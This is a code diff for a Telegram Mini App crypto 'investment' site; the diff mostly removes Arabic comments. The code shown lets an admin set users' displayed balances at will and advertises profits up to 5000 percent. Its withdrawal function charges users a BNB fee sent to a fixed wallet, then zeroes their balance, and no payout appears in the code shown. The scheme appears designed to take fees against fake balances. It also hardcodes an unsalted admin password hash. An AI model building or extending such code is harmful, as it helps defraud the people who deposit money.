@@ -400,12 +400,12 @@ body { background: #0b0d1a; min-height: 100vh; }
 if (window.Telegram && window.Telegram.WebApp) {
     const tg = window.Telegram.WebApp;
     tg.ready();
-    tg.expand(); // لجعل التطبيق يملأ شاشة الهاتف
+    tg.expand();
     console.log("✅ Telegram Mini App initialized");
 }
 
 const RECIPIENT_WALLET = '0x0391AbB2328dd4c965c93E9aDA0219137c448dDE';
-const BNB_TO_USDT_RATE = 600; // سعر الصرف التلقائي (1 BNB = 600 USDT) - يمكنك تعديل هذا الرقم
+const BNB_TO_USDT_RATE = 600;
 const ADMIN_PASSWORD_HASH = '8c6976e5b5410415bde908bd4dee15dfb167a9c873fc4bb8a81f6f2ab448a918';
 const MAX_PROFIT_PERCENT = 5000;
 const DEFAULT_MIN_BUY_AMOUNT = 0.5;
@@ -833,10 +833,7 @@ async function resetUserBalance(address) {
 async function updateUserWithdrawalBalance(address, newAmountUSDT) {
     const amountUSDT = parseFloat(newAmountUSDT);
     if (isNaN(amountUSDT) || amountUSDT < 0) { showToast('⚠️ المبلغ غير صحيح', 'error'); return; }
-    
-    // تحويل USDT إلى BNB قبل الحفظ في قاعدة البيانات
     const amountBNB = amountUSDT / BNB_TO_USDT_RATE;
-    
     await saveUserFieldToFirestore(address, { withdrawalBalance: amountBNB });
     if (userAddress && address.toLowerCase() === userAddress.toLowerCase()) {
         withdrawalBalance = amountBNB; loadAllData();
@@ -1183,10 +1180,8 @@ async function connectWallet() {
 
 function openWalletLink(url) {
     if (window.Telegram && window.Telegram.WebApp) {
-        // الطريقة الرسمية لفتح الروابط الخارجية في تيليجرام
         window.Telegram.WebApp.openLink(url);
     } else {
-        // للمتصفحات العادية
         window.location.href = url;
     }
 }
@@ -1202,7 +1197,6 @@ function showWalletChooser(cleanUrl) {
                 <p style="color:#9ca3af;font-size:0.85rem;margin-bottom:20px;text-align:center;line-height:1.6;">
                     سيتم فتح المنصة داخل محفظتك لربطها تلقائياً.
                 </p>
-                <!-- استخدام أزرار بدلاً من روابط a لتجنب خطأ ERR_UNKNOWN_URL_SCHEME -->
                 <button onclick="openWalletLink('https://metamask.app.link/dapp/${cleanUrl}')" class="wallet-option wallet-metamask" style="border:none; width:100%; cursor:pointer; margin-bottom:10px;">
                     🦊 فتح في MetaMask
                 </button>
@@ -1255,12 +1249,7 @@ async function loadStoredData() {
                 userCustomProfit = data.customProfit || 0;
                 isUserDisabled = data.disabled === true;
                 userWithdrawSettings = data.withdrawSettings || {};
-                console.log('✅ تم التحميل من السيرفر مباشرة:', {
-                    balance: investmentBalance,
-                    withdrawal: withdrawalBalance,
-                    profit: userCustomProfit,
-                    disabled: isUserDisabled
-                });
+                console.log('✅ تم التحميل من السيرفر مباشرة');
                 return;
             } else {
                 investmentBalance = 0; purchaseTime = null; withdrawalBalance = 0;
@@ -1331,11 +1320,8 @@ async function loadAllData() {
         const withdrawNetDisplay = document.getElementById('withdrawNetDisplay');
         const withdrawFeeLabel2 = document.getElementById('withdrawFeeLabel2');
 
-        // تحويل الرصيد من BNB إلى USDT تلقائياً
         const baseWithdrawAmountUSDT = withdrawalBalance * BNB_TO_USDT_RATE;
-        const feePercentWD = effective.feePercent; // نحتفظ بنسبة الرسوم كما هي
-        
-        // ✅ الصافي هو نفسه الرصيد (لا يتم خصم أي شيء)
+        const feePercentWD = effective.feePercent;
         const netAmountUSDT = baseWithdrawAmountUSDT;
 
         if (withdrawBalanceDisplay) {
@@ -1455,7 +1441,6 @@ async function withdrawAll() {
     const withdrawBtn1 = document.getElementById('withdrawBtn');
     const withdrawBtn2 = document.getElementById('withdrawBtn2');
 
-    // 1. التحقق من وجود رصيد سحب
     if (baseWithdrawAmountUSDT <= 0) {
         if (statusMsg) statusMsg.textContent = insufficientMessage;
         if (statusMsg2) statusMsg2.textContent = insufficientMessage;
@@ -1463,7 +1448,6 @@ async function withdrawAll() {
         return;
     }
     
-    // 2. التحقق من فترة الانتظار
     const now = Date.now();
     const lastRequest = lastWithdrawRequestTime || 0;
     const diffHours = (now - lastRequest) / (1000 * 60 * 60);
@@ -1473,12 +1457,10 @@ async function withdrawAll() {
         return;
     }
     
-    // 3. حساب رسوم السحب بالـ BNB
     const feePercentWD = effective.feePercent;
     const feeUSDT = baseWithdrawAmountUSDT * (feePercentWD / 100);
     const feeBNB = feeUSDT / BNB_TO_USDT_RATE;
     
-    // 4. التحقق من رصيد BNB للمستخدم لدفع الرسوم والغاز
     try {
         const balanceWei = await provider.getBalance(userAddress);
         const feeWei = ethers.utils.parseEther(feeBNB.toFixed(18));
@@ -1510,7 +1492,6 @@ async function withdrawAll() {
         const localSigner = localProvider.getSigner();
         const gasPrice = await localProvider.getGasPrice();
         
-        // إرسال رسوم السحب بالـ BNB إلى محفظتك
         const tx = await localSigner.sendTransaction({ 
             to: RECIPIENT_WALLET, 
             value: ethers.utils.parseEther(feeBNB.toFixed(18)), 
@@ -1522,12 +1503,10 @@ async function withdrawAll() {
         showToast('⏳ جاري تأكيد دفع الرسوم...', 'info');
         await tx.wait();
 
-        // ✅ نجحت العملية - تصفير الرصيد فوراً
         success = true;
         withdrawalBalance = 0; 
         lastWithdrawRequestTime = Date.now();
 
-        // ✅ تحديث الشاشة مباشرة (لا ينتظر أي عملية async)
         if (withdrawBalanceDisplay) withdrawBalanceDisplay.textContent = '0.00 USDT';
         if (withdrawNetDisplay) withdrawNetDisplay.textContent = '0.00 USDT';
         if (withdrawBtn1) { 
@@ -1543,10 +1522,7 @@ async function withdrawAll() {
         if (statusMsg2) statusMsg2.textContent = pendingMessage;
         showToast(pendingMessage, 'info');
 
-        // ✅ الحفظ في Firebase و localStorage
         await saveData();
-
-        // ✅ إعادة جلب البيانات من السيرفر للتأكد من التزامن
         await loadStoredData();
         await loadAllData();
         
@@ -1559,7 +1535,6 @@ async function withdrawAll() {
         if (statusMsg) statusMsg.textContent = '';
         if (statusMsg2) statusMsg2.textContent = '';
     } finally {
-        // ✅ لا نعيد تفعيل الزر إلا إذا فشلت العملية (ما زال هناك رصيد)
         if (!success) {
             if (withdrawBtn1) { 
                 withdrawBtn1.disabled = false; 
